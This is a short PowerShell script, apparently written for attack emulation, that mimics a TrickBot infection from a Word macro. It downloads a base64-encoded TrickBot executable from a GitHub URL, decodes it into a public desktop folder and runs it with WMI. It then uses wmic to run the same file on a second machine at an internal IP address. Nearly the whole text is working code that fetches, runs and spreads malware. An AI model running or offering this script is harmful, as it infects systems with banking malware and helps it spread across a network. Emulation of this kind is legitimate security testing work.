 # 2020-01-10 DJS and DKO, embedded Word Macro for Trickbot Infection, sample is downloaded from Github

# Retrieve base64 encoded nlaunch.exe (TrickBot) payload from Github
$InputString = (Invoke-RestMethod https://github.com/dorashancs/PayloadSamples/blob/master/trickbot_base64_encoded.txt).result

# Convert base64 string to byte array
$PEBytes = [System.Convert]::FromBase64String($InputString)

# Check for or create target payload directory
$WantFile = "C:\Users\Public\Desktop\Malware"
$FileExists = Test-Path $WantFile
If ($FileExists -eq $True) {} Else {New-Item -Path "C:\Users\Public\Desktop\" -Name "Malware" -ItemType "directory" | Out-Null}

# Write Base64 to local file
$filename = "C:\Users\Public\Desktop\Malware\nlaunch.exe"
$bytes = [Convert]::FromBase64String($InputString)
[IO.File]::WriteAllBytes($filename, $bytes)

#Execute local process
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList $filename

#Execute local PE remotely on BLOCK PC
wmic.exe /node:172.17.0.30 process call create \\172.16.0.26\c$\Users\Public\Desktop\Malware\nlaunch.exe 
